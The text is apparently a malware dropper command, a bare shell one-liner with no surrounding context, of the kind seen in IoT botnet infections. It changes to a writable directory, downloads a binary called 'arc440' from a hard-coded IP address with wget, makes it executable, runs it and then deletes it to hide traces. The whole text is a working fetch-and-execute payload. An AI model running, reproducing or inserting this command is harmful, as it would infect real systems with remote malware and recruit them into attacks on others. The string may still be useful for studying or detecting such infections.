cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/arc440; chmod +x arc440; ./arc440; rm -rf arc440
